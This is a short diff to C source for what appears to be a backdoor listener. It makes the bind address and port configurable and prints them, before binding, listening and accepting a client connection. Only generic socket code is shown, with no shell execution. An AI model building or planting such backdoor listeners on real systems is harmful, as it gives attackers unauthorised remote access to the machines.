@@ -30,8 +30,8 @@ int main(int argc, char *argv[]){
     memset(&backdoor, 0, sizeof(backdoor));
 
     backdoor.sin_family = AF_INET;
-    backdoor.sin_port = htons(SERVER_PORT);
-    backdoor.sin_addr.s_addr = inet_addr(SERVER_ADDR);
+    backdoor.sin_port = htons(atoi(backdoor_port));
+    backdoor.sin_addr.s_addr = inet_addr(backdoor_address);
 
     if(bind(sockfd_server, (struct sockaddr *)&backdoor, sizeof(struct sockaddr)) < 0){
         perror("bind");
@@ -42,12 +42,12 @@ int main(int argc, char *argv[]){
  
     if(listen(sockfd_server, SERVER_BACKLOG)){
         perror("listen");
-        exit(1);        
+        exit(1);
     }
     
     printf("[+]listening...\n");
-    printf("[+]Server: %s\n", SERVER_ADDR);
-    printf("[+]Port: %d\n", SERVER_PORT);
+    printf("[+]Server: %s\n", backdoor_address);
+    printf("[+]Port: %d\n", atoi(backdoor_port));
     
     if((sockfd_client = accept(sockfd_server, (struct sockaddr *) &client, &size)) < 0){
         perror("socket");
